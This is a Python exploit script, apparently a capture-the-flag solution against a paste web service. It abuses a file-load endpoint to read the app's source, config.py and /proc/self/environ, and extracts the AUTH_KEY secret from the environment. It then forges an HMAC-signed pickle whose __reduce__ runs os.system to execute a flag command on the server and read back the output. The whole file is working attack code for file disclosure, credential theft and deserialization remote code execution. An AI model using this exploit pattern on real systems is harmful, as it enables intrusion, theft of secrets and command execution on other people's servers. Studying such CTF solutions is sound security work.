import pickle
import requests
import sys
from Crypto.Cipher import AES
import os.path
import base64
import hmac
import hashlib


def main(target):
    src_path = get_source_path(target)
    print('Source path:', src_path)
    usable_key = get_key_data(target)
    key, iv = extract_key_nonce(usable_key)
    file_src = retrieve_path(target, src_path, usable_key)
    config_src = retrieve_path(
            target, src_path.replace('main.py', 'config.py'), usable_key)
    print(config_src.decode('utf-8'))
    environ_src = retrieve_path(
            target, '/proc/self/environ', usable_key)
    auth_key = extract_auth_key(environ_src)
    print('Auth Key: "%s"' % auth_key.decode('utf-8'))
    exploit = build_exploit(auth_key, '/home/flag/getflag > /tmp/matirflag')
    retrieve_path(target, '/etc/passwd', exploit)
    flag = retrieve_path(
            target, '/tmp/matirflag', usable_key)
    print('Flag: ', flag)


def get_source_path(target):
    r = requests.get(target)
    src_line = [a for a in r.text.split('\n') if '<!-- Source' in a][0]
    return src_line.split(': ')[1].split(' ')[0]


def get_key_data(target):
    data = {'paste': 'foobarbaz'}
    r = requests.post(target + '/upload', data=data)
    resp = r.json()
    return resp['key']


def extract_key_nonce(key_data):
    sig, e_key = key_data.split('!')
    key_d = base64.urlsafe_b64decode(e_key)
    key_s = pickle.loads(key_d)
    return key_s['key'], key_s['iv']


def retrieve_path(target, src_path, key_data):
    data = {
            'file': src_path,
            'key': key_data,
            }
    r = requests.get(target + '/load', data)
    if r.status_code != 200:
        print('Error:', r.status_code)
        return ''
    key, iv = extract_key_nonce(key_data)
    return decrypt_data(r.content, key, iv)


def extract_auth_key(environ):
    pairs = environ.split(b'\x00')
    for p in pairs:
        k, v = p.split(b'=', 1)
        if k == b'AUTH_KEY':
            return v


def decrypt_data(data, key, iv):
    cip = AES.new(key, AES.MODE_CTR, nonce=iv)
    return cip.decrypt(data)


def build_exploit(auth_key, cmd):
    exp = Exp(cmd)
    exp_d = pickle.dumps(exp)
    mac = hmac.new(auth_key, msg=exp_d, digestmod=hashlib.sha256).digest()[:16]
    return (
            base64.urlsafe_b64encode(mac) + b"!" +
            base64.urlsafe_b64encode(exp_d)).decode('utf-8')


class Exp:

    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return os.system, (self.cmd, )


if __name__ == '__main__':
    main(sys.argv[1])
